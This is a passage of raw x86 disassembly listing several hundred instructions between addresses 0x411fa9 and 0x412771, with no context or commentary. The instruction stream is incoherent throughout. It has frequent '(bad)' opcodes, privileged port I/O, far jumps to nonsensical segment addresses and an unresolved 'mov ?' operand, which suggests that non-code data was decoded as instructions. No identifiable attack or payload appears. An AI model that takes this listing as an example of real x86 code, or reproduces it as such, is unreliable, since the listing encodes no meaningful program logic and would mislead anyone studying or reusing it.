  411fa9:	sub    eax,0x8b0f87b6
  411fae:	cmp    bh,cl
  411fb0:	ins    DWORD PTR es:[edi],dx
  411fb1:	out    dx,al
  411fb2:	and    cl,bl
  411fb4:	mov    WORD PTR [ebp-0x61],ss
  411fb7:	data16 mov ch,0xd7
  411fba:	test   BYTE PTR [ecx],al
  411fbc:	cs dec eax
  411fbe:	mov    ah,0x77
  411fc0:	mov    al,ds:0x519b36a5
  411fc5:	sub    DWORD PTR [eax-0xcc9f843],edi
  411fcb:	mov    ah,0xbc
  411fcd:	cmp    eax,0x51dd435d
  411fd2:	jecxz  0x412019
  411fd4:	fsubr  DWORD PTR [ebx+ebx*1+0x1c]
  411fd8:	in     al,dx
  411fd9:	and    eax,0xc6a39a04
  411fde:	jecxz  0x411f77
  411fe0:	xlat   BYTE PTR ds:[ebx]
  411fe1:	loop   0x412047
  411fe3:	push   edi
  411fe4:	out    0x7c,al
  411fe6:	add    DWORD PTR [edx-0xb],eax
  411fe9:	cmp    BYTE PTR [edx+ebp*8-0x75],dh
  411fed:	(bad)  
  411fee:	jecxz  0x411f96
  411ff0:	lods   eax,DWORD PTR ds:[esi]
  411ff1:	int3   
  411ff2:	repz es jg 0x412036
  411ff6:	(bad)  
  411ff7:	daa    
  411ff8:	(bad)  
  411ff9:	pop    ss
  411ffa:	and    eax,DWORD PTR [ebp-0x36]
  411ffd:	and    eax,0x6d0ca711
  412002:	mov    bl,0x8b
  412004:	push   ebp
  412005:	jl     0x411fc5
  412007:	scas   al,BYTE PTR es:[edi]
  412008:	shl    DWORD PTR [esi-0x5842d1a],0x43
  41200f:	sbb    al,0x14
  412011:	xlat   BYTE PTR ds:[ebx]
  412012:	push   esi
  412013:	xor    eax,0x9313197d
  412018:	int    0x1f
  41201a:	xor    al,BYTE PTR [edx]
  41201c:	in     eax,0xaf
  41201e:	add    esi,DWORD PTR [eax]
  412020:	cmp    bl,BYTE PTR [ebx+0x372e961d]
  412026:	fbstp  TBYTE PTR [ebx-0x65]
  412029:	pusha  
  41202a:	sbb    eax,0x747b59e6
  41202f:	sub    di,di
  412032:	cmp    DWORD PTR [ebp-0x6c],ebp
  412035:	lds    edx,FWORD PTR [eax+eax*1+0x44]
  412039:	lahf   
  41203a:	aaa    
  41203b:	int3   
  41203c:	ins    DWORD PTR es:[edi],dx
  41203d:	sbb    BYTE PTR [edx],0xef
  412040:	or     DWORD PTR [eax],ecx
  412042:	jp     0x412044
  412044:	xlat   BYTE PTR ds:[ebx]
  412045:	test   al,0x7b
  412047:	sub    dl,BYTE PTR [eax-0x60]
  41204a:	int3   
  41204b:	rol    BYTE PTR [ecx+0x62d737ea],0x8d
  412052:	pop    ecx
  412053:	test   DWORD PTR [esp+0x5ba33d6f],ecx
  41205a:	mov    ebx,0x1a08227c
  41205f:	dec    esp
  412060:	pop    ebx
  412061:	push   ecx
  412062:	sub    edx,DWORD PTR [edi+0x89a4168]
  412068:	push   0xcc709f61
  41206d:	lahf   
  41206e:	inc    edx
  41206f:	(bad)  
  412070:	mov    edx,0x67cc828e
  412075:	add    ah,BYTE PTR [edx+0x5c]
  412078:	add    eax,0xb5ddbef
  41207d:	push   edx
  41207e:	std    
  41207f:	jbe    0x4120d7
  412081:	mov    ebp,0x665cd697
  412086:	pop    esi
  412087:	ror    dl,0x9c
  41208a:	data16 xlat BYTE PTR ds:[ebx]
  41208c:	sahf   
  41208d:	out    dx,eax
  41208e:	or     BYTE PTR [edx-0x19dfb455],dh
  412094:	std    
  412095:	push   cs
  412096:	add    eax,ecx
  412098:	lds    ecx,FWORD PTR [ecx-0x57195f88]
  41209e:	pop    edi
  41209f:	add    bl,BYTE PTR [eax+0x3d2bfe25]
  4120a5:	adc    al,0x1e
  4120a7:	inc    esp
  4120a8:	mov    al,ds:0xe9aa5c68
  4120ad:	imul   ebx,DWORD PTR [eax],0x43
  4120b0:	and    eax,0x3db3218a
  4120b5:	repnz push 0x51
  4120b8:	dec    edx
  4120b9:	mov    ds:0x6b4b3900,eax
  4120be:	jb     0x41204b
  4120c0:	xchg   edx,eax
  4120c1:	sar    dh,cl
  4120c3:	dec    ebx
  4120c4:	xchg   ebx,eax
  4120c5:	push   ebp
  4120c6:	jnp    0x412060
  4120c8:	std    
  4120c9:	or     BYTE PTR [ebp+0x1ce485c5],0x76
  4120d0:	jnp    0x4120bc
  4120d2:	out    0x9f,al
  4120d4:	mov    DWORD PTR [ecx-0x7e],ecx
  4120d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d8:	mov    bh,0x80
  4120da:	xchg   esi,eax
  4120db:	inc    ecx
  4120dc:	jge    0x412068
  4120de:	pop    es
  4120df:	in     al,dx
  4120e0:	aas    
  4120e1:	mov    ds:0xf59c84cf,al
  4120e6:	xchg   esi,eax
  4120e7:	add    al,0x58
  4120e9:	and    al,0x4f
  4120eb:	mov    ch,0x56
  4120ed:	shl    BYTE PTR [edx],1
  4120ef:	xor    DWORD PTR [esi+0x9],0x6b
  4120f3:	aad    0x7
  4120f5:	pop    esp
  4120f6:	aas    
  4120f7:	mov    esi,0x8d82866
  4120fc:	and    cl,bl
  4120fe:	pop    esp
  4120ff:	pop    edx
  412100:	pop    es
  412101:	repz imul esi,ebx,0xbe7334c5
  412108:	add    eax,0x5ba11e94
  41210d:	mov    ah,0x47
  41210f:	mov    cl,0x21
  412111:	stos   BYTE PTR es:[edi],al
  412112:	inc    ebp
  412113:	push   ds
  412114:	out    dx,al
  412115:	dec    ebx
  412116:	sub    BYTE PTR [esp+eiz*4+0x54],cl
  41211a:	fcomp  DWORD PTR [ebp-0x5b505e6e]
  412120:	mov    ch,0xa0
  412122:	loope  0x4120ba
  412124:	test   eax,0x4d3158f4
  412129:	inc    esp
  41212a:	and    BYTE PTR [ebx-0x78],bh
  41212d:	push   ecx
  41212e:	mov    WORD PTR ds:0x8e73108e,ss
  412134:	sahf   
  412135:	xchg   ebx,eax
  412136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412137:	jl     0x4120bb
  412139:	xlat   BYTE PTR ds:[ebx]
  41213a:	xchg   DWORD PTR [edi+0x5267148],ebp
  412140:	and    eax,0x12382635
  412145:	retf   
  412146:	fsub   st(2),st
  412148:	div    BYTE PTR [ecx+0x4f36ac5f]
  41214e:	sbb    ah,bl
  412150:	in     al,dx
  412151:	out    0x1,eax
  412153:	adc    al,0xe4
  412155:	sbb    al,0x6b
  412157:	test   al,0x83
  412159:	pop    edx
  41215a:	in     eax,0x41
  41215c:	imul   edi,DWORD PTR [esi+0x18],0x5387fd54
  412163:	ror    DWORD PTR [esi],1
  412165:	xchg   edx,eax
  412166:	add    eax,0xb81cf619
  41216b:	fnsave [edx+0x5]
  41216e:	xchg   DWORD PTR [edx-0x3a],edx
  412171:	lods   eax,DWORD PTR ds:[esi]
  412172:	aas    
  412173:	adc    dh,BYTE PTR [ebp-0x65574c82]
  412179:	pop    ecx
  41217a:	mov    edi,0x3fe76d09
  41217f:	loopne 0x4121fe
  412181:	ret    0xdbc6
  412184:	loopne 0x412133
  412186:	in     eax,dx
  412187:	call   0xabd1:0x66beedc3
  41218e:	dec    esp
  41218f:	cld    
  412190:	add    BYTE PTR [ecx-0xf],dh
  412193:	cmp    ebx,DWORD PTR [ebp+edi*8-0x73a53739]
  41219a:	sbb    DWORD PTR [ecx+0x1f],ecx
  41219d:	inc    ecx
  41219e:	mov    ecx,DWORD PTR [edx+0x18]
  4121a1:	sub    eax,DWORD PTR [edi]
  4121a3:	out    dx,eax
  4121a4:	sti    
  4121a5:	ins    DWORD PTR es:[edi],dx
  4121a6:	xor    ecx,ecx
  4121a8:	pop    ds
  4121a9:	xor    al,0xfe
  4121ab:	inc    ebp
  4121ac:	in     eax,dx
  4121ad:	xchg   edx,eax
  4121ae:	inc    ah
  4121b0:	mov    bl,0x3d
  4121b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121b3:	cmp    DWORD PTR [esi+0x20],ebx
  4121b6:	retf   0xffa6
  4121b9:	xor    eax,0x45ee3b35
  4121be:	pop    edi
  4121bf:	test   al,0x96
  4121c1:	mov    DWORD PTR [ebx],esi
  4121c3:	sbb    eax,0xeac7d32f
  4121c8:	hlt    
  4121c9:	xchg   edi,eax
  4121ca:	xchg   DWORD PTR [esi+ebp*8+0x5d],ecx
  4121ce:	and    bh,bl
  4121d0:	or     bl,BYTE PTR [ecx+eax*2]
  4121d3:	mov    al,0xc8
  4121d5:	and    BYTE PTR [ebp+edi*4+0x7c],0x2
  4121da:	ja     0x41218a
  4121dc:	scas   al,BYTE PTR es:[edi]
  4121dd:	or     esi,esi
  4121df:	out    0x30,al
  4121e1:	or     eax,0xb894f8c2
  4121e6:	repnz out dx,eax
  4121e8:	adc    edx,esi
  4121ea:	fidiv  DWORD PTR [edi-0x1762d6c3]
  4121f0:	cmp    DWORD PTR [ecx],ebx
  4121f2:	xlat   BYTE PTR ds:[ebx]
  4121f3:	aas    
  4121f4:	test   eax,0x8f2ca7e8
  4121f9:	add    al,al
  4121fb:	stc    
  4121fc:	aaa    
  4121fd:	js     0x4121e1
  4121ff:	add    DWORD PTR [edi-0x32bb4946],esp
  412205:	xchg   edx,eax
  412206:	xor    ecx,DWORD PTR [ebp-0x3e]
  412209:	adc    bl,BYTE PTR [edx-0x17]
  41220c:	jb     0x4121e8
  41220e:	nop
  41220f:	cwde   
  412210:	pop    ds
  412211:	repnz fidivr WORD PTR [esi]
  412214:	jg     0x4121fe
  412216:	adc    eax,esi
  412218:	adc    al,0x8d
  41221a:	lock or DWORD PTR [esp+ecx*8-0x48],0x96b68533
  412223:	push   edi
  412224:	inc    eax
  412225:	mov    ebx,0x71212825
  41222a:	mov    ebp,0x4cca07a2
  41222f:	push   0x53
  412231:	in     eax,0x92
  412233:	inc    ecx
  412234:	fs mov ebp,0xe98e03ef
  41223b:	retf   0xe092
  41223e:	xchg   edi,eax
  41223f:	and    eax,0x6eca7ffc
  412244:	pop    es
  412245:	push   ds
  412246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412247:	fldln2 
  412249:	or     edi,DWORD PTR [ecx+0x5f]
  41224c:	adc    ecx,DWORD PTR [ebx+0x12d86b58]
  412252:	sbb    al,0xfe
  412254:	test   BYTE PTR [edx+0x1d],dl
  412257:	dec    ecx
  412258:	xchg   BYTE PTR [edx],cl
  41225a:	mov    esp,0x9703b01c
  41225f:	mov    al,ds:0x2db9e8e2
  412264:	ds fucomi st,st(2)
  412267:	icebp  
  412268:	or     eax,0x5e49cf26
  41226d:	jbe    0x412275
  41226f:	outs   dx,DWORD PTR ds:[esi]
  412270:	jg     0x4122f0
  412272:	mov    ch,0xa8
  412274:	xchg   esp,eax
  412275:	or     DWORD PTR [esi+0x38b8b29e],edi
  41227b:	sub    bl,bh
  41227d:	std    
  41227e:	jle    0x412235
  412280:	call   0xf9dc7ca4
  412285:	mov    edx,ss
  412287:	add    bh,bh
  412289:	push   eax
  41228a:	loope  0x4122ee
  41228c:	adc    al,0xc1
  41228e:	and    al,0x96
  412290:	inc    eax
  412291:	mov    al,0x4f
  412293:	in     eax,dx
  412294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412295:	xchg   DWORD PTR ss:[esi],edi
  412298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412299:	stc    
  41229a:	mov    ds,WORD PTR [edi+edx*8+0x67]
  41229e:	nop
  41229f:	test   DWORD PTR [ebp-0x4e5656c9],ecx
  4122a5:	mov    dl,0x9b
  4122a7:	mov    DWORD PTR [edx],esp
  4122a9:	pusha  
  4122aa:	mov    bh,0xc1
  4122ac:	cld    
  4122ad:	sbb    BYTE PTR [eax-0x26fe3d12],cl
  4122b3:	and    bh,BYTE PTR [edi+0x5d]
  4122b6:	dec    ebp
  4122b7:	(bad)  
  4122b8:	stc    
  4122b9:	aas    
  4122ba:	cdq    
  4122bb:	push   edi
  4122bc:	hlt    
  4122bd:	xor    BYTE PTR [edi+0x3241d056],al
  4122c3:	js     0x412254
  4122c5:	psllq  mm3,QWORD PTR [ebp+0x48a7d17f]
  4122cc:	cld    
  4122cd:	mov    dh,0x51
  4122cf:	dec    ecx
  4122d0:	xchg   DWORD PTR [esi+0x788500ec],ebx
  4122d6:	cs pop edi
  4122d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122d9:	repnz outs dx,BYTE PTR ds:[esi]
  4122db:	xor    eax,0xaa2a8786
  4122e0:	xor    ebp,DWORD PTR [ecx]
  4122e2:	hlt    
  4122e3:	pop    ss
  4122e4:	pop    es
  4122e5:	call   0x4df0:0x27148c47
  4122ec:	push   esp
  4122ed:	push   ebx
  4122ee:	(bad)  
  4122f0:	push   eax
  4122f1:	scas   eax,DWORD PTR es:[edi]
  4122f2:	ret    
  4122f3:	cs out 0x79,al
  4122f6:	mov    ah,0x52
  4122f8:	push   ss
  4122f9:	cdq    
  4122fa:	loope  0x4122dd
  4122fc:	pop    eax
  4122fd:	xor    ch,BYTE PTR [edx+0x5a0c07b3]
  412303:	and    BYTE PTR [edx+0x11],cl
  412306:	rcl    BYTE PTR [eax+0x47eb9c4f],1
  41230c:	jmp    0x6647:0x3e4f3258
  412313:	push   ebp
  412314:	mov    al,0xc7
  412317:	sbb    cl,BYTE PTR [ebx+0x73e30796]
  41231d:	daa    
  41231e:	pop    ds
  41231f:	or     bh,BYTE PTR [esi+0x19]
  412322:	test   al,0x38
  412324:	jnp    0x412309
  412326:	sbb    eax,0xc557d61b
  41232b:	push   edi
  41232c:	mov    ds:0x7fb43e78,al
  412331:	js     0x412317
  412333:	fs mov bl,0xcc
  412336:	sbb    al,cl
  412338:	dec    edi
  412339:	jnp    0x4123aa
  41233b:	fdiv   DWORD PTR [ecx-0x19]
  41233e:	dec    ecx
  41233f:	push   cs
  412340:	nop
  412341:	cmp    BYTE PTR [esi+0x29],cl
  412344:	scas   al,BYTE PTR es:[edi]
  412345:	mov    ds:0x827d905a,al
  41234a:	retf   0x493d
  41234d:	push   ebp
  41234e:	push   cs
  41234f:	sahf   
  412350:	ret    
  412351:	jle    0x412386
  412353:	enter  0xaf97,0x96
  412357:	sub    BYTE PTR [eax-0x3a0ccc52],bl
  41235d:	cmp    bl,BYTE PTR [eax]
  41235f:	sub    eax,0xcbbd9a90
  412364:	rcl    BYTE PTR [edx+0x54],0x14
  412368:	pop    esi
  412369:	adc    edx,DWORD PTR [esi]
  41236b:	mov    ch,0xc6
  41236d:	add    BYTE PTR [edi-0x72],dh
  412370:	aaa    
  412371:	stos   BYTE PTR es:[edi],al
  412372:	mov    esi,0x1c3862a5
  412377:	icebp  
  412378:	add    eax,0xd9a30cbd
  41237d:	cld    
  41237e:	or     al,0x8e
  412380:	int    0x24
  412382:	dec    edi
  412383:	nop
  412384:	or     esp,ebx
  412386:	in     al,dx
  412387:	(bad)  
  412389:	cmovnp edx,DWORD PTR [edi]
  41238c:	fxtract 
  41238e:	outs   dx,DWORD PTR ds:[esi]
  41238f:	mov    al,ds:0xc3717c63
  412394:	push   edi
  412395:	pandn  mm3,QWORD PTR [ebp+0x152c187e]
  41239c:	mov    dl,0x26
  41239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239f:	test   eax,0xcd7d03a5
  4123a4:	cs enter 0xf1e,0xfa
  4123a9:	popa   
  4123aa:	pop    esi
  4123ab:	cmc    
  4123ac:	jae    0x4123b7
  4123ae:	fist   DWORD PTR [edi+0x39]
  4123b1:	ficom  DWORD PTR [esi+0x12640d45]
  4123b7:	(bad)  [edx+esi*1-0x33fbfc6c]
  4123be:	xchg   edx,eax
  4123bf:	fisubr WORD PTR [edx-0x118ed020]
  4123c5:	dec    ebx
  4123c6:	(bad)  
  4123c7:	mov    cs,ebx
  4123c9:	xlat   BYTE PTR ds:[ebx]
  4123ca:	scas   al,BYTE PTR es:[edi]
  4123cb:	push   edx
  4123cc:	mov    al,ds:0xb4325236
  4123d1:	nop
  4123d2:	and    esi,ebp
  4123d4:	xchg   DWORD PTR [ecx+0x383a55b1],esi
  4123da:	mov    cs,WORD PTR [esi-0x6591bb02]
  4123e0:	leave  
  4123e1:	push   ecx
  4123e2:	out    0x17,eax
  4123e4:	test   al,0x55
  4123e6:	enter  0x1a3b,0x28
  4123ea:	cwde   
  4123eb:	push   edx
  4123ec:	repz sub BYTE PTR [eax-0x3dc4085],ah
  4123f3:	in     al,0xb5
  4123f5:	mov    BYTE PTR [bp+si-0x65],ch
  4123f9:	or     cl,BYTE PTR [esi]
  4123fb:	jo     0x4123b0
  4123fd:	dec    eax
  4123fe:	nop
  4123ff:	mov    bh,0xcd
  412401:	rcr    ah,0x22
  412404:	call   0xa4c56760
  412409:	add    DWORD PTR [eax-0x21be571],ebp
  41240f:	sub    eax,0x815d87bd
  412414:	test   DWORD PTR [ecx+0x5e58e1fc],eax
  41241a:	bound  edx,QWORD PTR [edi+0x39]
  41241d:	cmc    
  41241e:	mov    ds:0x450dc1,eax
  412423:	sar    DWORD PTR [esi],0x3c
  412426:	mov    al,0x1a
  412428:	xchg   ecx,eax
  412429:	popa   
  41242a:	adc    eax,0xb38381db
  41242f:	mov    ebp,0x7d6ef981
  412434:	fistp  DWORD PTR ss:[edx]
  412437:	retf   
  412438:	xchg   esi,eax
  412439:	mov    bl,0x0
  41243b:	call   0x9b72f08c
  412440:	inc    eax
  412441:	frstor ds:0x32204ed2
  412447:	lds    ebp,FWORD PTR [ecx+edx*4-0x232d62d8]
  41244e:	inc    esi
  41244f:	xchg   ebx,eax
  412450:	cmp    BYTE PTR [eax-0x4b],cl
  412453:	shl    BYTE PTR [eax],0x89
  412456:	or     bl,BYTE PTR [ebp+0x5a0aeab3]
  41245c:	out    0x69,eax
  41245e:	test   ax,0x4569
  412462:	(bad)  
  412463:	(bad)  
  412465:	repz mov ch,0x3e
  412468:	rcr    DWORD PTR [edi],0x8f
  41246b:	(bad)  
  41246c:	scas   al,BYTE PTR es:[edi]
  41246d:	mov    bh,0x27
  41246f:	and    eax,DWORD PTR [esi-0x40a99186]
  412475:	stos   DWORD PTR es:[edi],eax
  412476:	mov    ch,0x5e
  412478:	cmp    al,al
  41247a:	sub    ah,cl
  41247c:	into   
  41247d:	ins    BYTE PTR es:[edi],dx
  41247e:	jb     0x4124cb
  412480:	daa    
  412481:	outs   dx,BYTE PTR ds:[esi]
  412482:	push   esi
  412483:	test   eax,0xf150561d
  412488:	mov    edx,0xc1ec0735
  41248d:	clc    
  41248e:	ret    
  41248f:	mov    ecx,0x494421fc
  412494:	xor    ecx,edx
  412496:	adc    eax,0xa5660fab
  41249b:	scas   eax,DWORD PTR es:[edi]
  41249c:	add    eax,0x987ebfdd
  4124a1:	in     al,dx
  4124a2:	sub    dl,bh
  4124a4:	ins    BYTE PTR es:[edi],dx
  4124a5:	test   eax,0x593f3015
  4124aa:	fs out 0xe0,al
  4124ad:	inc    esp
  4124ae:	addr16 sbb ch,cl
  4124b1:	sub    DWORD PTR [ebx],eax
  4124b3:	popa   
  4124b4:	mov    ah,0x72
  4124b6:	out    0x59,al
  4124b8:	sbb    edi,eax
  4124ba:	das    
  4124bb:	xchg   esi,eax
  4124bc:	out    dx,al
  4124bd:	fld    DWORD PTR [eax-0x72f15e85]
  4124c3:	in     eax,0x81
  4124c5:	push   0x12
  4124c7:	jno    0x412543
  4124c9:	es or  ebx,0xd4faacd1
  4124d0:	fidivr WORD PTR [eax+0x29]
  4124d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124d4:	lock adc al,0x54
  4124d7:	push   cs
  4124d8:	addr16 cmp cl,dh
  4124db:	test   BYTE PTR [ebp+0x2f],dl
  4124de:	xchg   edi,eax
  4124df:	pushf  
  4124e0:	pop    ds
  4124e1:	into   
  4124e2:	xchg   edx,eax
  4124e3:	pop    esp
  4124e4:	jns    0x41254d
  4124e6:	pop    ebx
  4124e7:	outs   dx,BYTE PTR ds:[esi]
  4124e8:	inc    ecx
  4124e9:	(bad)  
  4124ea:	js     0x4124a9
  4124ec:	mov    edx,0xb67b1a0e
  4124f1:	test   al,0x8a
  4124f3:	jb     0x412506
  4124f5:	jmp    0x41249b
  4124f7:	aam    0xcb
  4124f9:	cmp    DWORD PTR [esi],ebp
  4124fb:	sub    al,0x2a
  4124fd:	sub    DWORD PTR [eax-0xf742f85],eax
  412503:	daa    
  412504:	xor    eax,0xd41ca5e3
  412509:	ret    
  41250a:	cmp    dl,BYTE PTR [esi]
  41250c:	adc    al,BYTE PTR [ecx]
  41250e:	outs   dx,DWORD PTR ds:[esi]
  41250f:	pop    eax
  412510:	push   ebp
  412511:	pop    ss
  412512:	mov    al,0x8d
  412514:	call   0x5f2785f6
  412519:	jecxz  0x4124b8
  41251b:	(bad)  
  41251c:	rcl    DWORD PTR ds:[ebx],cl
  41251f:	call   0x53d22ade
  412524:	scas   al,BYTE PTR es:[edi]
  412525:	xchg   ecx,eax
  412526:	xchg   esp,eax
  412527:	pop    edi
  412528:	xchg   edi,eax
  412529:	pop    es
  41252a:	in     al,0xc5
  41252c:	cmp    dl,BYTE PTR [ecx+ebx*1+0x628ae7c1]
  412533:	or     eax,0xac2bdb21
  412538:	jns    0x412577
  41253a:	mov    al,BYTE PTR [edi+0x46]
  41253d:	mov    DWORD PTR [eax],edi
  41253f:	mov    bl,0xfa
  412541:	enter  0xe58c,0xcb
  412545:	hlt    
  412546:	inc    ebx
  412547:	sub    al,0x58
  412549:	or     DWORD PTR [esi],edx
  41254b:	cmp    BYTE PTR [edx],bh
  41254d:	pop    ebp
  41254e:	enter  0xcfe4,0x8b
  412552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412553:	(bad)  
  412554:	std    
  412555:	jbe    0x4125ce
  412557:	or     eax,0x997b4f81
  41255c:	nop
  41255d:	cmp    eax,0x8ba2de67
  412562:	push   ebp
  412563:	or     bh,BYTE PTR [bp+0xff]
  412568:	mov    WORD PTR [esi+0x1af40f9b],gs
  41256e:	mov    WORD PTR ds:0xca39aa8e,fs
  412574:	loope  0x4125a0
  412576:	ret    
  412577:	mov    eax,ds:0x7e42cff7
  41257c:	jl     0x41258c
  41257e:	dec    esp
  41257f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412580:	inc    esi
  412581:	loope  0x41257c
  412583:	bound  edx,QWORD PTR [ecx]
  412585:	mov    dl,0xb9
  412587:	xchg   esp,eax
  412588:	push   cs
  412589:	mov    ds:0xaf414d93,al
  41258e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412590:	and    ecx,DWORD PTR [ecx]
  412592:	iret   
  412593:	jecxz  0x41253b
  412595:	lds    esi,FWORD PTR [esi-0x74]
  412598:	and    eax,0x3a0809e9
  41259d:	adc    bh,BYTE PTR [edx+0xf]
  4125a0:	sbb    DWORD PTR [esi-0x418d1adb],esp
  4125a6:	mov    ch,0xb7
  4125a8:	xchg   ecx,eax
  4125a9:	addr16 sbb eax,0x848f0315
  4125af:	mov    ah,0x22
  4125b1:	in     eax,0xf9
  4125b3:	jl     0x41253a
  4125b5:	jb     0x4125a8
  4125b7:	adc    eax,0x2d866bc2
  4125bc:	arpl   WORD PTR [ecx],di
  4125be:	cmp    ecx,eax
  4125c0:	xor    eax,0x74609a98
  4125c5:	dec    edi
  4125c6:	adc    edi,edi
  4125c8:	inc    edi
  4125c9:	sbb    eax,0xc23f1dd5
  4125ce:	out    0xb0,al
  4125d0:	fiadd  WORD PTR [esi+0x4a]
  4125d3:	xor    al,0x17
  4125d5:	(bad)
  4125d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125d9:	pop    ebp
  4125da:	xor    eax,0x927503d6
  4125df:	and    DWORD PTR [ebx],esp
  4125e1:	pop    ebx
  4125e2:	out    dx,eax
  4125e3:	(bad)  
  4125e4:	fidiv  WORD PTR [ebx+esi*8-0x5c]
  4125e8:	inc    edx
  4125e9:	out    dx,al
  4125ea:	ret    
  4125eb:	(bad)  
  4125ec:	out    dx,al
  4125ed:	adc    ebp,DWORD PTR [ebx]
  4125ef:	pusha  
  4125f0:	inc    esp
  4125f1:	imul   ebx,edx,0xffffffa1
  4125f4:	call   FWORD PTR ds:0x9e6efdfb
  4125fa:	addr16 enter 0xd0a5,0x90
  4125ff:	sub    cl,cl
  412601:	icebp  
  412602:	pop    es
  412603:	cdq    
  412604:	mov    ebx,0x83b2f50
  412609:	ret    
  41260a:	popf   
  41260b:	push   ds
  41260c:	mov    al,0x7e
  41260e:	out    0xf9,eax
  412610:	int    0x75
  412612:	xor    eax,0x3b6abdbc
  412617:	imul   eax,DWORD PTR [ebx],0xfffffff1
  41261a:	rcl    BYTE PTR [edx+ebx*8],cl
  41261d:	or     al,0x25
  41261f:	ins    BYTE PTR es:[edi],dx
  412620:	xchg   esp,eax
  412621:	jle    0x41261f
  412623:	mov    ecx,0xf70c1d6
  412628:	js     0x4125dd
  41262a:	sahf   
  41262b:	data16 cli 
  41262d:	mov    dh,0x65
  41262f:	add    ebx,edi
  412631:	int    0x16
  412633:	mov    ebx,0xb10e1fab
  412638:	sbb    eax,ecx
  41263a:	pop    eax
  41263b:	mov    esi,0xe749636f
  412640:	xchg   cl,dh
  412642:	(bad)  
  412643:	rcl    dl,cl
  412645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412646:	jo     0x4126b2
  412648:	mov    esp,0x8b0a245f
  41264d:	iret   
  41264e:	jbe    0x4126cc
  412650:	jecxz  0x412687
  412652:	fst    QWORD PTR [ebx]
  412654:	scas   eax,DWORD PTR es:[edi]
  412655:	dec    edi
  412656:	stc    
  412657:	psrad  mm6,QWORD PTR gs:[edi+0x62]
  41265c:	jge    0x41260a
  41265e:	mov    esi,0x6ac46b9e
  412663:	and    BYTE PTR [ebp+0x33],0xe4
  412667:	sub    eax,0xa5a53e88
  41266c:	sar    DWORD PTR [ebx-0x4b],cl
  41266f:	push   ss
  412670:	sbb    DWORD PTR [ecx],0x4a821c5b
  412676:	xchg   ebp,eax
  412677:	imul   edx,DWORD PTR [edi],0xa11efb08
  41267d:	or     cl,BYTE PTR [eax+0x36]
  412680:	inc    ebp
  412681:	xor    ah,BYTE PTR [esi+0x50]
  412684:	pushf  
  412685:	lea    ebp,[eax]
  412687:	jle    0x4126a0
  412689:	imul   ebp,DWORD PTR [esi-0x15],0x64
  41268d:	or     DWORD PTR [ebx+0x19],edi
  412690:	in     eax,dx
  412691:	and    al,0x69
  412693:	push   esp
  412694:	mov    ch,0x1b
  412696:	icebp  
  412697:	adc    DWORD PTR [edx+0xe],eax
  41269a:	inc    ebp
  41269b:	fst    DWORD PTR [eax]
  41269d:	leave  
  41269e:	mov    eax,0xde27a266
  4126a3:	repz mov ds:0xd05b35c9,al
  4126a9:	or     dl,BYTE PTR [edi]
  4126ab:	je     0x41266e
  4126ad:	repnz push esi
  4126af:	jae    0x4126ab
  4126b1:	scas   al,BYTE PTR es:[edi]
  4126b2:	fidiv  WORD PTR [ecx+0x1a3a617e]
  4126b8:	dec    eax
  4126b9:	clc    
  4126ba:	fld    QWORD PTR [ebx-0x452e816b]
  4126c0:	mov    ch,0x62
  4126c2:	addr16 gs adc eax,0xf72fa8df
  4126c9:	push   es
  4126ca:	pop    ss
  4126cb:	sub    BYTE PTR [edi+0x57],al
  4126ce:	icebp  
  4126cf:	xchg   BYTE PTR [ebp+edx*4+0x57],dl
  4126d3:	push   es
  4126d4:	pushf  
  4126d5:	mov    edi,0x7de8d62e
  4126da:	fadd   QWORD PTR [ebp+0x28d227f2]
  4126e0:	fwait
  4126e1:	mov    al,0x67
  4126e3:	xchg   DWORD PTR [ebp+ebx*8+0x56],ebp
  4126e7:	mov    di,0xe455
  4126eb:	mov    DWORD PTR fs:[eax-0x822db0],edi
  4126f2:	inc    esp
  4126f3:	sbb    ah,BYTE PTR [edi-0x7c013d8c]
  4126f9:	or     DWORD PTR [edi+0x35],eax
  4126fc:	dec    edx
  4126fd:	mov    ch,ah
  4126ff:	sbb    ecx,DWORD PTR [ebx-0x7d883b48]
  412705:	jmp    0x20e6:0x840035d8
  41270c:	lods   al,BYTE PTR ds:[esi]
  41270d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41270f:	inc    ebp
  412710:	out    dx,al
  412711:	sbb    BYTE PTR [esp+eiz*4+0x5],ch
  412715:	mov    esi,DWORD PTR [edx]
  412717:	add    DWORD PTR [edi+0x63de4d98],0x79
  41271e:	mov    ch,0x85
  412720:	outs   dx,DWORD PTR ss:[esi]
  412722:	inc    edi
  412723:	add    al,0xdb
  412725:	mov    edx,0xa83bbc1b
  41272a:	push   cs
  41272b:	jns    0x41276f
  41272d:	inc    ebp
  41272e:	mov    ?,WORD PTR [eax+0x4a]
  412731:	mov    cs,WORD PTR [edx]
  412733:	and    bl,BYTE PTR ds:0x8195552d
  412739:	test   DWORD PTR [esi+0x22c86c98],ebp
  41273f:	adc    DWORD PTR [eax],eax
  412741:	sbb    BYTE PTR ds:0x1c449524,bl
  412747:	cmp    eax,0x8c773668
  41274c:	xchg   ecx,eax
  41274d:	jo     0x4127c1
  41274f:	popf   
  412750:	jb     0x4127b2
  412752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412753:	adc    DWORD PTR [esp+eax*4-0xd],ebx
  412757:	stos   BYTE PTR es:[edi],al
  412758:	in     eax,dx
  412759:	mov    ah,0x57
  41275b:	dec    edi
  41275c:	aam    0xf
  41275e:	mov    DWORD PTR [edi],0x6f9e6164
  412764:	(bad)  
  412765:	push   eax
  412766:	lock xor cl,ah
  412769:	(bad)  
  41276a:	mov    ecx,ds
  41276c:	jp     0x4126ef
  41276e:	into   
  41276f:	loopne 0x412720
  412771:	cdq    
